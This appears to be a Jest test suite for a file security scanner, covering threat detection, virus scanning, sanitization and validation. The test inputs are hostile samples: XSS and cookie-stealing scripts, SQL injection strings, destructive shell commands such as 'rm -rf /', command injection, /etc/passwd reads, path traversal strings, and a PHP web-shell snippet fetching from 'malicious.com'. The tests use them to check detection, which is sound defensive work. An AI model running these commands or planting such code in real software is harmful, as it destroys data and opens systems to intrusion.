import { SecurityScanner } from '@/lib/processors/advanced/security-scanner';
import {
  SecurityScanResult,
  ThreatType,
  SecurityThreat,
  SanitizationResult
} from '@/lib/processors/advanced/types';

describe('SecurityScanner', () => {
  let scanner: SecurityScanner;

  beforeEach(() => {
    scanner = new SecurityScanner();
  });

  describe('scanFile', () => {
    it('should scan clean file successfully', async () => {
      const cleanBuffer = Buffer.from('This is a clean text file with no threats.');

      const result = await scanner.scanFile('clean.txt', cleanBuffer, 'text/plain');

      expect(result.status).toBe('safe');
      expect(result.threats).toHaveLength(0);
      expect(result.confidence).toBeGreaterThan(0.8);
    });

    it('should detect suspicious patterns', async () => {
      const suspiciousContent = `
        <script>alert('xss')</script>
        SELECT * FROM users WHERE password = '';
        rm -rf /
        powershell.exe -command "malicious code"
      `;
      const suspiciousBuffer = Buffer.from(suspiciousContent);

      const result = await scanner.scanFile('suspicious.txt', suspiciousBuffer, 'text/plain');

      expect(result.status).toBe('threat_detected');
      expect(result.threats.length).toBeGreaterThan(0);

      const threatTypes = result.threats.map(t => t.type);
      expect(threatTypes).toContain(ThreatType.MALICIOUS_SCRIPT);
      expect(threatTypes).toContain(ThreatType.SQL_INJECTION);
    });

    it('should provide detailed threat information', async () => {
      const maliciousContent = '<script>document.cookie</script>';
      const maliciousBuffer = Buffer.from(maliciousContent);

      const result = await scanner.scanFile('malicious.html', maliciousBuffer, 'text/html');

      expect(result.threats.length).toBeGreaterThan(0);

      const threat = result.threats[0];
      expect(threat).toHaveProperty('type');
      expect(threat).toHaveProperty('severity');
      expect(threat).toHaveProperty('description');
      expect(threat).toHaveProperty('location');
      expect(threat).toHaveProperty('confidence');
    });

    it('should handle binary files', async () => {
      // Create a mock executable-like buffer
      const binaryBuffer = Buffer.from([0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00]); // PE header start

      const result = await scanner.scanFile('suspicious.exe', binaryBuffer, 'application/octet-stream');

      expect(result.status).toBe('threat_detected');
      const threatTypes = result.threats.map(t => t.type);
      expect(threatTypes).toContain(ThreatType.EMBEDDED_EXECUTABLE);
    });

    it('should respect file size limits', async () => {
      const largeBuffer = Buffer.alloc(100 * 1024 * 1024, 'x'); // 100MB

      const result = await scanner.scanFile('large.txt', largeBuffer, 'text/plain');

      expect(result.status).toBe('threat_detected');
      const threatTypes = result.threats.map(t => t.type);
      expect(threatTypes).toContain(ThreatType.OVERSIZED_FILE);
    });
  });

  describe('detectThreats', () => {
    it('should detect XSS patterns', async () => {
      const xssContent = `
        <script>alert('xss')</script>
        javascript:void(0)
        onload="malicious()"
        <iframe src="javascript:alert('xss')"></iframe>
      `;
      const buffer = Buffer.from(xssContent);

      const threats = await scanner.detectThreats('test.html', buffer, 'text/html');

      const maliciousScriptThreats = threats.filter(t => t.type === ThreatType.MALICIOUS_SCRIPT);
      expect(maliciousScriptThreats.length).toBeGreaterThan(0);

      maliciousScriptThreats.forEach(threat => {
        expect(threat.severity).toBeGreaterThanOrEqual(3);
        expect(threat.confidence).toBeGreaterThan(0.7);
      });
    });

    it('should detect SQL injection patterns', async () => {
      const sqlContent = `
        SELECT * FROM users WHERE id = 1 OR 1=1;
        DROP TABLE users;
        UNION SELECT password FROM admin;
        ' OR '1'='1
      `;
      const buffer = Buffer.from(sqlContent);

      const threats = await scanner.detectThreats('query.sql', buffer, 'text/plain');

      const sqlThreats = threats.filter(t => t.type === ThreatType.SQL_INJECTION);
      expect(sqlThreats.length).toBeGreaterThan(0);
    });

    it('should detect command injection patterns', async () => {
      const commandContent = `
        rm -rf /
        del /f /s /q C:\\*
        $(rm -rf /)
        \`rm -rf /\`
        ; cat /etc/passwd
      `;
      const buffer = Buffer.from(commandContent);

      const threats = await scanner.detectThreats('commands.sh', buffer, 'text/plain');

      const commandThreats = threats.filter(t => t.type === ThreatType.COMMAND_INJECTION);
      expect(commandThreats.length).toBeGreaterThan(0);
    });

    it('should detect path traversal attempts', async () => {
      const pathContent = `
        ../../../etc/passwd
        ..\\..\\..\\windows\\system32
        %2e%2e%2f%2e%2e%2f%2e%2e%2f
        ....//....//....//
      `;
      const buffer = Buffer.from(pathContent);

      const threats = await scanner.detectThreats('paths.txt', buffer, 'text/plain');

      const pathThreats = threats.filter(t => t.type === ThreatType.PATH_TRAVERSAL);
      expect(pathThreats.length).toBeGreaterThan(0);
    });
  });

  describe('scanForViruses', () => {
    it('should return clean result for normal content', async () => {
      const cleanBuffer = Buffer.from('This is clean content');

      const result = await scanner.scanForViruses(cleanBuffer);

      expect(result.status).toBe('clean');
      expect(result.threatsFound).toBe(0);
      expect(result.scanTime).toBeGreaterThan(0);
    });

    it('should detect EICAR test signature', async () => {
      // EICAR test string (harmless test virus signature)
      const eicarString = 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*';
      const eicarBuffer = Buffer.from(eicarString);

      const result = await scanner.scanForViruses(eicarBuffer);

      expect(result.status).toBe('infected');
      expect(result.threatsFound).toBeGreaterThan(0);
      expect(result.threats![0]).toMatchObject({
        name: expect.stringContaining('EICAR'),
        type: 'test_signature'
      });
    });

    it('should handle scan timeouts', async () => {
      const largeBuffer = Buffer.alloc(10 * 1024 * 1024, 'x');

      const result = await scanner.scanForViruses(largeBuffer);

      expect(result).toBeDefined();
      expect(result.scanTime).toBeDefined();
    });
  });

  describe('sanitizeContent', () => {
    it('should remove malicious scripts', async () => {
      const maliciousHtml = `
        <p>Safe content</p>
        <script>alert('malicious')</script>
        <div onclick="malicious()">Click me</div>
        <iframe src="javascript:void(0)"></iframe>
      `;
      const buffer = Buffer.from(maliciousHtml);

      const result = await scanner.sanitizeContent(buffer, 'text/html');

      expect(result.success).toBe(true);
      expect(result.sanitizedContent.toString()).not.toContain('<script>');
      expect(result.sanitizedContent.toString()).not.toContain('onclick=');
      expect(result.sanitizedContent.toString()).not.toContain('javascript:');
      expect(result.sanitizedContent.toString()).toContain('Safe content');
    });

    it('should clean SQL injection attempts', async () => {
      const sqlContent = `
        SELECT name FROM users WHERE id = 1;
        DROP TABLE users; --
        ' OR 1=1 --
      `;
      const buffer = Buffer.from(sqlContent);

      const result = await scanner.sanitizeContent(buffer, 'text/plain');

      expect(result.success).toBe(true);
      expect(result.removedThreats.length).toBeGreaterThan(0);
      expect(result.removedThreats.some(t => t.includes('DROP TABLE'))).toBe(true);
    });

    it('should preserve safe content', async () => {
      const safeContent = `
        <p>This is a safe paragraph</p>
        <div class="container">Safe content</div>
        <a href="https://example.com">Safe link</a>
      `;
      const buffer = Buffer.from(safeContent);

      const result = await scanner.sanitizeContent(buffer, 'text/html');

      expect(result.success).toBe(true);
      expect(result.sanitizedContent.toString()).toContain('This is a safe paragraph');
      expect(result.sanitizedContent.toString()).toContain('Safe content');
      expect(result.sanitizedContent.toString()).toContain('https://example.com');
    });

    it('should handle different content types', async () => {
      const jsonContent = JSON.stringify({
        name: 'test',
        script: '<script>alert("xss")</script>',
        safe: 'This is safe content'
      });
      const buffer = Buffer.from(jsonContent);

      const result = await scanner.sanitizeContent(buffer, 'application/json');

      expect(result.success).toBe(true);

      const sanitized = JSON.parse(result.sanitizedContent.toString());
      expect(sanitized.name).toBe('test');
      expect(sanitized.safe).toBe('This is safe content');
      expect(sanitized.script).not.toContain('<script>');
    });
  });

  describe('validateFile', () => {
    it('should validate safe files', async () => {
      const safeBuffer = Buffer.from('Safe content');

      const result = await scanner.validateFile('safe.txt', safeBuffer, 'text/plain');

      expect(result.isValid).toBe(true);
      expect(result.issues).toHaveLength(0);
    });

    it('should invalidate files with threats', async () => {
      const maliciousBuffer = Buffer.from('<script>alert("xss")</script>');

      const result = await scanner.validateFile('malicious.html', maliciousBuffer, 'text/html');

      expect(result.isValid).toBe(false);
      expect(result.issues.length).toBeGreaterThan(0);
      expect(result.issues[0].severity).toBeGreaterThan(0);
    });

    it('should check file size limits', async () => {
      const oversizedBuffer = Buffer.alloc(200 * 1024 * 1024, 'x'); // 200MB

      const result = await scanner.validateFile('huge.txt', oversizedBuffer, 'text/plain');

      expect(result.isValid).toBe(false);
      expect(result.issues.some(issue => issue.type === 'file_size_exceeded')).toBe(true);
    });

    it('should validate MIME type consistency', async () => {
      const htmlContent = '<html><body>HTML content</body></html>';
      const buffer = Buffer.from(htmlContent);

      // Claim it's a text file when it's clearly HTML
      const result = await scanner.validateFile('fake.txt', buffer, 'text/plain');

      expect(result.warnings.length).toBeGreaterThan(0);
      expect(result.warnings.some(w => w.includes('MIME type mismatch'))).toBe(true);
    });
  });

  describe('heuristic analysis', () => {
    it('should detect suspicious patterns through heuristics', async () => {
      const suspiciousContent = `
        eval(base64_decode($_POST['payload']));
        system($_GET['cmd']);
        file_get_contents('http://malicious.com/backdoor.php');
      `;
      const buffer = Buffer.from(suspiciousContent);

      const result = await scanner.scanFile('suspicious.php', buffer, 'application/x-php');

      expect(result.status).toBe('threat_detected');

      const heuristicThreats = result.threats.filter(t =>
        t.description.toLowerCase().includes('heuristic') ||
        t.description.toLowerCase().includes('suspicious')
      );
      expect(heuristicThreats.length).toBeGreaterThan(0);
    });

    it('should calculate risk scores', async () => {
      const riskContent = 'document.write(unescape("%3Cscript%3E"));';
      const buffer = Buffer.from(riskContent);

      const result = await scanner.scanFile('risky.js', buffer, 'application/javascript');

      expect(result.riskScore).toBeGreaterThan(0);
      expect(result.riskScore).toBeLessThanOrEqual(100);
    });
  });

  describe('performance and limits', () => {
    it('should handle concurrent scans', async () => {
      const buffers = Array.from({ length: 5 }, (_, i) =>
        Buffer.from(`Test content ${i}`)
      );

      const promises = buffers.map((buffer, i) =>
        scanner.scanFile(`test${i}.txt`, buffer, 'text/plain')
      );

      const results = await Promise.all(promises);

      expect(results).toHaveLength(5);
      results.forEach(result => {
        expect(result.status).toBeDefined();
      });
    });

    it('should respect timeout limits', async () => {
      const largeBuffer = Buffer.alloc(50 * 1024 * 1024, 'x');

      const startTime = Date.now();
      const result = await scanner.scanFile('large.txt', largeBuffer, 'text/plain');
      const endTime = Date.now();

      expect(endTime - startTime).toBeLessThan(30000); // Should complete within 30 seconds
      expect(result).toBeDefined();
    });
  });
});